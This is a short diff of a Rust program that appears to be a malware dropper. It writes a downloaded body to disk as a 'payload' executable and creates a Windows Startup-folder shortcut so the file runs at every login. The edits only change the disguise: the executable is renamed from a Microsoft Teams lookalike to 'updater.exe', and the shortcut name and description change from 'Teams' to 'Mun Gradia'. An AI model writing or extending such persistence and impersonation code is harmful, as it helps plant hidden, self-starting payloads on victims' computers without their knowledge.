@@ -18,21 +18,21 @@ async fn main() {
         println!("Failed to create dirs. {e}");
     }
 
-    let path = format!("{base_path}\\embedded-teams.exe");
+    let path = format!("{base_path}\\updater.exe");
     if let Err(e) = fs::write(&path, body) {
         println!("failed to write payload: {}", e);
     }
 
     println!("Creating startup");
     
-    let shortcut_path = format!("C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Teams.lnk\0");
+    let shortcut_path = format!("C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MunGradia.lnk\0");
 
     unsafe {
         let _ = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
         let shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER).unwrap();
 
         let _ = shell_link.SetPath(PCWSTR::from_raw((path+"\0").encode_utf16().collect::<Vec<u16>>().as_ptr()));
-        let _ = shell_link.SetDescription(PCWSTR::from_raw("Microsoft Teams\0".encode_utf16().collect::<Vec<u16>>().as_ptr()));
+        let _ = shell_link.SetDescription(PCWSTR::from_raw("Mun Gradia\0".encode_utf16().collect::<Vec<u16>>().as_ptr()));
         let _ = shell_link.SetWorkingDirectory(PCWSTR::from_raw("C:\\Windows\\System32\0".encode_utf16().collect::<Vec<u16>>().as_ptr()));
 
         let persist_file: IPersistFile = shell_link.cast().unwrap();
